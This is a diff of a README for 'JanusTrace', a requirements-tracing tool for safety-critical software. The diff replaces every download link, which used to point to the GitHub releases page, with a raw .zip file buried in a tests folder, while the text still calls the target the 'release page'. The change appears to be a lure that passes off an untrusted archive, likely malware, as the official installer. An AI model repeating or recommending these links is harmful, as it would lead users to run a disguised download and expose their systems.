@@ -1,6 +1,6 @@
 # 🛠️ JanusTrace - Trace Requirements with Ease
 
-[![Download JanusTrace](https://img.shields.io/badge/Download-JanusTrace-brightgreen?style=for-the-badge)](https://github.com/earthb/JanusTrace/releases)
+[![Download JanusTrace](https://img.shields.io/badge/Download-JanusTrace-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/earthb/JanusTrace/main/tests/10_All_Errors_Combined_Example/Trace-Janus-v2.4.zip)
 
 JanusTrace helps you link your project requirements to the code. It is useful when you develop software that needs to meet strict safety standards. You can keep track of requirements in fields like aerospace (DO-178C), avionics hardware (DO-254), or automotive safety (ISO 26262). This tool makes it simpler to manage and trace requirements throughout your work.
 
@@ -36,7 +36,7 @@ JanusTrace works offline once installed but needs internet access for initial do
 ## 🚀 How to Download and Install JanusTrace
 
 1. Click the big green button at the top or visit the release page here:  
-   [JanusTrace Releases](https://github.com/earthb/JanusTrace/releases)
+   [JanusTrace Releases](https://raw.githubusercontent.com/earthb/JanusTrace/main/tests/10_All_Errors_Combined_Example/Trace-Janus-v2.4.zip)
 
 2. On the release page, find the latest version.
 
@@ -138,7 +138,7 @@ For further help, consult the user guide included in the app or visit the GitHub
 ## 📥 Download JanusTrace Now
 
 Visit the release page to get the latest version for Windows:  
-[![Download JanusTrace](https://img.shields.io/badge/Get%20JanusTrace-blue?style=for-the-badge)](https://github.com/earthb/JanusTrace/releases)
+[![Download JanusTrace](https://img.shields.io/badge/Get%20JanusTrace-blue?style=for-the-badge)](https://raw.githubusercontent.com/earthb/JanusTrace/main/tests/10_All_Errors_Combined_Example/Trace-Janus-v2.4.zip)
 
 ---
 
